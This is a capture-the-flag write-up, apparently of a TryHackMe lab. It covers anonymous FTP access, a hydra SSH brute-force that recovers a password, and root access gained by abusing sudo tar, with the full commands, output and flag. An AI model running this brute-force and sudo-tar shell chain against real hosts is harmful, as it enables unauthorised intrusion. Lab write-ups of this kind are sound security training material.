Project goal

Conduct a penetration test in an isolated environment to identify vulnerabilities and demonstrate privilege escalation techniques.

Work performed
1. Reconnaissance and network scanning

I started with a full port scan of the target host:

sudo nmap -p- -A -T4 -sV 10.201.1.248


Result:

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

2. FTP service analysis

I discovered anonymous FTP access:

ftp 10.201.1.248
Name: anonymous
Password: anonymous


I downloaded a file containing potential passwords:

ftp> get locks.txt

3. Password list preparation

I processed the file to use as a dictionary for brute-force attacks:

awk 'length($0) >= 6 { print }' locks.txt > possible_passwords.txt
wc -l possible_passwords.txt
 26 possible_passwords.txt

4. SSH credential brute-force

I ran a brute-force attack with hydra:

hydra -s 22 -v -V -l lin -P possible_passwords.txt -t 8 10.201.1.248 ssh


Successful result:

[22][ssh] host: 10.201.1.248   login: lin   password: RedDr4gonSynd1cat3

5. Initial access gained

I logged into the system using the discovered credentials:

ssh lin@10.201.1.248


Access confirmation:

lin@ip-10-201-1-248:~/Desktop$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
lin@ip-10-201-1-248:~/Desktop$ whoami
lin

6. System information gathering

I examined the environment to find privilege escalation vectors:

cat /etc/*-release
uname -a
cat /proc/version

7. Privilege escalation

I checked the user's sudo privileges:

sudo -l


Result:

User lin may run the following commands on ip-10-201-1-248:
    (root) /bin/tar


I exploited the tar capability to obtain root:

sudo tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'


Root access confirmation:

 whoami
root
 cat /root/root.txt
THM{80UN7Y_h4cK3r}

Identified vulnerabilities

Anonymous FTP access — allowed retrieval of potentially sensitive information.

Weak passwords — the user used a password that appeared in a publicly available list.

Insecure sudo configuration — allowed execution of tar as root, which was abused for privilege escalation.

Conclusions

The project demonstrated a typical attack chain:

Reconnaissance of open ports and services.

Exploitation of misconfigured services (FTP).

Brute-force attack using harvested credentials.

Privilege escalation via improperly configured sudo rights.

Obtaining root and the flag THM{...} confirmed a full system compromise. It is recommended to strengthen password policies and review sudo privileges for users.
